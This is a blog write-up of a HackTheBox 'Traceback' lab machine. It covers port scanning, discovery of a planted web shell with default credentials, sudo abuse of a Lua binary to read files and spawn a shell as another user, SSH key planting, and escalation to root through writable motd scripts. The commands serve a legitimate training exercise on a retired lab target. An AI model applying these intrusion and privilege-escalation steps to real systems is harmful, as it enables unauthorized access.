---
layout: post
title: "Writeup: HackTheBox Traceback - NO Metasploit"
description: "Rooting Traceback without using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][].
All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Traceback

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.181</small>_

I kick things off with a port scan.

```bash
sudo nmap -sS -T4 -p- 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 00:35 EDT                                                  
Nmap scan report for 10.10.10.181                                                                                
Host is up (0.019s latency).                                                                                     
Not shown: 65533 closed ports                                                                                    
PORT   STATE SERVICE                                                                                             
22/tcp open  ssh                                                                                                 
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds
```

```bash
sudo nmap -sT -T4 -p22,80 -A -sC -sV 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 00:36 EDT
Nmap scan report for 10.10.10.181
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   23.83 ms 10.10.14.1
2   16.39 ms 10.10.10.181
```

All right, a web server.

[gobuster][] doesn't turn up anything.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 20 -u http://10.10.10.181/ -x txt,php
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 30 -u http://10.10.10.181 -x txt,php
```

Navigating to `http://10.10.10.181/` brings up a page with the following message:

> This site has been owned
>
> I have left a backdoor for all the net. FREE INTERNETZZZ
>
> Xh4H -

The source of the page includes the comment:

```html
<!--Some of the best web shells that you might need ;)-->
```

Searching the internet for `Xh4H` brings up [this tweet][]:

> Pretty interesting collection of webshells: https://t.co/gRllNN08zt
>
> — Xh4H (@RiftWhiteHat) March 10, 2020

That brings me to <https://github.com/TheBinitGhimire/Web-Shells>.
I compile a wordlist of web shell endpoints and run them through `gobuster`.
This time I get a hit!

```bash
gobuster dir -w webshells.txt -u http://10.10.10.181
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.181
[+] Threads:        10
[+] Wordlist:       webshells.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/09 00:53:10 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/06/09 00:53:10 Finished
===============================================================
```

Navigating to that URL brings up a web shell login page.
Looking at the [web shell source][], I see the credentials are `admin / admin`.
This logs me in.
I can run commands through the web shell, but I cannot trigger netcat.

![webshell commands][]

I opt for some information gathering before creating a full reverse shell through this web shell.
I am running as the `webadmin` user.
There is another user on the system as well, `sysadmin`.
In the `webadmin`'s directory, I find a note:

![webadmin note][]

A tool somewhere that lets me invoke Lua, huh?
I check `webadmin`'s bash history and find the location of the script:

![webadmin history][]

`/home/sysadmin/luvit` it is.
And it looks like `webadmin` has permission to run the script:

![webadmin sudo][]

[GTFOBins][lua gtfobin] has some suggestions on how to use Lua for my purposes.
I can read the user flag with:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'local f=io.open("/home/sysadmin/user.txt", "rb"); print(f:read("*a")); io.close(f);'
```

Now for the reverse shell.
Instead of figuring out a Lua one-liner, I opt to upload a PHP reverse shell (like `/use/share/webshells/php/php-reverse-shell.php` that is included on Kali) to the web server using the `smevk` web shell.
This gives me a `webadmin` user shell.
With a TTY shell, I can escalate my privileges to `sysadmin` by running:

```bash
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash -i")'
```

I check to see what files `sysadmin` can access on the server:

```bash
find / -type f -user sysadmin 2>/dev/null | grep -v '/proc/'

/home/sysadmin/.bashrc
/home/sysadmin/luvit
/home/sysadmin/.bash_logout
/home/sysadmin/.ssh/authorized_keys
/home/sysadmin/.cache/motd.legal-displayed
/home/sysadmin/.bash_history
/home/sysadmin/user.txt
/home/sysadmin/.profile
/home/webadmin/note.txt
```

`/home/sysadmin/.cache/motd.legal-displayed` is unusual, but otherwise not interesting.
I also run [LinEnum][] which highlights an interesting process that seems related to this file.

![motd cron][]

It appears that every 30 seconds, `root` updates the `motd` content.
`motd` handles the banner messages when you ssh onto a system.
Since I am `sysadmin`, I can go to `/home/sysadmin/.ssh/authorized_keys` and add my public key.
SSHing onto the system, I see the following banner message:

![motd login][]

I see this message comes from the `/etc/update-motd.d/00-header` file.

![motd original][]

`sysadmin` has write access to these files.

```bash
sysadmin@traceback:/etc/update-motd.d$ ls -l
total 24
-rwxrwxr-x 1 root sysadmin  981 Jun  8 23:17 00-header
-rwxrwxr-x 1 root sysadmin  982 Jun  8 23:17 10-help-text
-rwxrwxr-x 1 root sysadmin 4264 Jun  8 23:17 50-motd-news
-rwxrwxr-x 1 root sysadmin  604 Jun  8 23:17 80-esm
-rwxrwxr-x 1 root sysadmin  299 Jun  8 23:17 91-release-upgrade
```

I should be able to get a reverse shell by modifying this `00-header` file, but I couldn't get the syntax correct.
The official Traceback write-up has a payload, it seems.
Instead, I opted to read the root flag.

![motd read root][]

When I next SSH onto the system, I am presented with the root flag.
Remember that root flags are ephemeral these days, so this root flag is no longer valid and attempting to use it may get your HTB account flagged.

![root flag][]

[gobuster]: https://github.com/OJ/gobuster
[hackthebox]: https://www.hackthebox.eu
[linenum]: https://github.com/rebootuser/LinEnum
[lua gtfobin]: https://gtfobins.github.io/gtfobins/lua/
[this tweet]: https://twitter.com/riftwhitehat/status/1237311680276647936?lang=en
[web shell source]: https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php#L14

[motd cron]: /assets/img/htb/traceback/root-updates-motd-cron.png
[motd login]: /assets/img/htb/traceback/ssh-motd-login-message.png
[motd read root]: /assets/img/htb/traceback/motd-read-root-flag.png
[motd original]: /assets/img/htb/traceback/motd-original-header.png
[root flag]: /assets/img/htb/traceback/root-flag.png
[webadmin history]: /assets/img/htb/traceback/lua-location.png
[webadmin note]: /assets/img/htb/traceback/webadmin-note.png
[webadmin sudo]: /assets/img/htb/traceback/webadmin-sudo-perms.png
[webshell commands]: /assets/img/htb/traceback/webshell-run-commands.png
